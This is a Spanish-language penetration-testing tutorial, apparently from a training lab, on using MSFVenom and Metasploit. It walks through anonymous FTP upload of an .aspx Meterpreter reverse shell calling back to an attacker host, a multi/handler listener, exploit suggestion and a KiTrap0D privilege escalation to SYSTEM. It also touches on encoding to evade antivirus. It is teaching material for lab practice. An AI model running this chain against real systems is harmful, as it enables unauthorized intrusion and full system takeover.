# Introduction to MSFVenom

## MSFVenom: Una Introducción

MSFVenom es el sucesor de MSFPayload y MSFEncode, dos scripts independientes que solían trabajar en conjunto con msfconsole para proporcionar a los usuarios cargas útiles altamente personalizables y difíciles de detectar para sus exploits.

MSFVenom es el resultado de la fusión de estas dos herramientas. Antes de esta herramienta, teníamos que canalizar (`|`) el resultado de MSFPayload, que se usaba para generar código de máquina para una arquitectura de procesador y versión de sistema operativo específicos, en MSFEncode, que contenía múltiples esquemas de codificación utilizados tanto para eliminar caracteres indeseables del código de máquina (lo que a veces podía causar inestabilidad durante la ejecución) como para evadir software de prevención/detección de intrusiones (IPS/IDS) y antivirus (AV) más antiguos.

Hoy en día, estas dos herramientas combinadas ofrecen a los testers de penetración un método para crear rápidamente cargas útiles para diferentes arquitecturas de host y versiones, mientras tienen la posibilidad de "limpiar" su código de máquina para que no genere errores al desplegarse. La parte de evasión de antivirus es mucho más complicada hoy en día, ya que el análisis basado solo en firmas de archivos maliciosos es cosa del pasado. El análisis heurístico, el aprendizaje automático y la inspección profunda de paquetes hacen que sea mucho más difícil que una carga útil pase por varias iteraciones de un esquema de codificación para evadir cualquier buen software antivirus. Como se vio en el módulo de Cargas Útiles, enviar una carga útil simple con la misma configuración detallada anteriormente resultó en una tasa de detección de 52/65. En términos de analistas de malware en todo el mundo, eso es un Bingo. (Todavía no se ha demostrado que los analistas de malware en todo el mundo realmente digan "eso es un Bingo".)

### Creando Nuestras Cargas Útiles

Supongamos que hemos encontrado un puerto FTP abierto que tenía credenciales débiles o estaba abierto a inicio de sesión anónimo por accidente. Ahora, supongamos que el servidor FTP en sí está vinculado a un servicio web que se ejecuta en el puerto tcp/80 de la misma máquina y que todos los archivos encontrados en el directorio raíz del FTP se pueden ver en el directorio `/uploads` del servicio web. También supongamos que el servicio web no tiene ninguna verificación sobre lo que se nos permite ejecutar como cliente.

Si hipotéticamente se nos permite llamar a cualquier cosa que queramos desde el servicio web, podemos subir un shell PHP directamente a través del servidor FTP y acceder a él desde la web, activando la carga útil y permitiéndonos recibir una conexión TCP inversa desde la máquina víctima.

### Escaneando el Objetivo

```bash
sherlock28@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
```

```bash
<SNIP>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Acceso Anónimo por FTP

```bash
sherlock28@htb[/htb]$ ftp 10.10.10.5
```

```vbnet
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: ******
230 User logged in.
Remote system type is Windows_NT.
```

```bash
ftp> ls
```

```arduino
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Al notar el directorio `aspnet_client`, nos damos cuenta de que la máquina podrá ejecutar shells reversos `.aspx`. Afortunadamente, MSFVenom puede hacer eso sin ningún problema.

### Generando la Carga Útil

```bash
sherlock28@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

```yaml
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

```bash
sherlock28@htb[/htb]$ ls
```

```
Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
```

Ahora solo necesitamos navegar a `http://10.10.10.5/reverse_shell.aspx`, y esto activará la carga útil `.aspx`. Sin embargo, antes de hacerlo, deberíamos iniciar un listener en msfconsole para que la solicitud de conexión inversa se capture dentro de él.

### MSF - Configurando Multi/Handler

```bash
sherlock28@htb[/htb]$ msfconsole -q 
```

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > show options
```

```sql
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

```bash
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
```

```makefile
LHOST => 10.10.14.5
```

```bash
msf6 exploit(multi/handler) > set LPORT 1337
```

```makefile
LPORT => 1337
```

```bash
msf6 exploit(multi/handler) > run
```

```csharp
[*] Started reverse TCP handler on 10.10.14.5:1337 
```

## Ejecutando la Carga Útil

Ahora podemos activar la carga útil `.aspx` en el servicio web. Hacer esto no mostrará nada visualmente en la página, pero al volver a nuestro módulo multi/handler, deberíamos haber recibido una conexión. Debemos asegurarnos de que nuestro archivo `.aspx` no contenga HTML, por lo que solo veremos una página web en blanco. Sin embargo, la carga útil se ejecuta en segundo plano de todos modos.

### MSF - Meterpreter Shell

```
less
```

```less
<...SNIP...>
[*] Started reverse TCP handler on 10.10.14.5:1337 

[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000
```

```arduino
meterpreter > getuid

Server username: IIS APPPOOL\Web
```

```css
meterpreter > 
[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
```

Si la sesión de **Meterpreter** muere con demasiada frecuencia, podemos considerar codificarla para evitar errores durante el tiempo de ejecución. Podemos escoger cualquier codificador viable, y esto mejorará nuestras probabilidades de éxito.

## Local Exploit Suggester

Como consejo, hay un módulo llamado **Local Exploit Suggester**. Usaremos este módulo ya que la shell de **Meterpreter** se ejecuta con el usuario `IIS APPPOOL\Web`, que no tiene muchos permisos. Además, el comando `sysinfo` muestra que el sistema tiene arquitectura de 32 bits (x86), lo que nos da más razones para confiar en este módulo.

### **MSF - Búsqueda del Local Exploit Suggester**

```yaml
msf6 > search local exploit suggester

<...SNIP...>
   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure
<SNIP>
```

```scss
msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > show options
```

**Opciones del módulo** (`post/multi/recon/local_exploit_suggester`):

| Nombre          | Configuración Actual | Requerido | Descripción                                                   |
| --------------- | -------------------- | --------- | ------------------------------------------------------------- |
| SESSION         |                      | sí        | La sesión en la que ejecutar este módulo                      |
| SHOWDESCRIPTION | false                | sí        | Muestra una descripción detallada de los exploits disponibles |

```arduino
msf6 post(multi/recon/local_exploit_suggester) > set session 2
session => 2
```

```scss
msf6 post(multi/recon/local_exploit_suggester) > run
```

```less
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Con estos resultados, podemos escoger fácilmente uno para probar. Si el que escogemos no es válido, probamos el siguiente. No todas las comprobaciones son 100% exactas y no todos los entornos son iguales. Al revisar los resultados, **bypassuac\_eventvwr** falla porque el usuario IIS no es parte del grupo de administradores, lo cual es esperado. El segundo exploit, **ms10\_015\_kitrap0d**, funciona.

### MSF - Escalación de Privilegios Local

```scss
msf6 exploit(multi/handler) > search kitrap0d
```

**Módulos coincidentes**:

| # | Nombre                                    | Fecha de Divulgación | Rango | Comprobación | Descripción                                 |
| - | ----------------------------------------- | -------------------- | ----- | ------------ | ------------------------------------------- |
| 0 | exploit/windows/local/ms10\_015\_kitrap0d | 2010-01-19           | great | Yes          | Escalación a SYSTEM en Windows vía KiTrap0D |

***

```scss
msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
```

**Opciones del módulo** (`exploit/windows/local/ms10_015_kitrap0d`):

| Nombre  | Configuración Actual | Requerido | Descripción                            |
| ------- | -------------------- | --------- | -------------------------------------- |
| SESSION | 2                    | sí        | La sesión en la que ejecutar el módulo |

***

**Opciones del payload** (`windows/meterpreter/reverse_tcp`):

| Nombre   | Configuración Actual | Requerido | Descripción                                                  |
| -------- | -------------------- | --------- | ------------------------------------------------------------ |
| EXITFUNC | process              | sí        | Técnica de salida (Accepted: '', seh, thread, process, none) |
| LHOST    | tun0                 | sí        | La dirección de escucha (puede especificarse una interfaz)   |
| LPORT    | 1338                 | sí        | El puerto de escucha                                         |

***

**Objetivo del exploit**:

| Id | Nombre                           |
| -- | -------------------------------- |
| 0  | Windows 2K SP4 - Windows 7 (x86) |

***

```arduino
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
LPORT => 1338
```

```arduino
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
SESSION => 3
```

```scss
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
```

```less
[*] Started reverse TCP handler on 10.10.14.5:1338 
[*] Launching notepad to host the exploit...
[+] Process 3552 launched.
[*] Reflectively injecting the exploit DLL into 3552...
[*] Injecting exploit into 3552 ...
[*] Exploit injected. Injecting payload into 3552...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000
```

```arduino
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
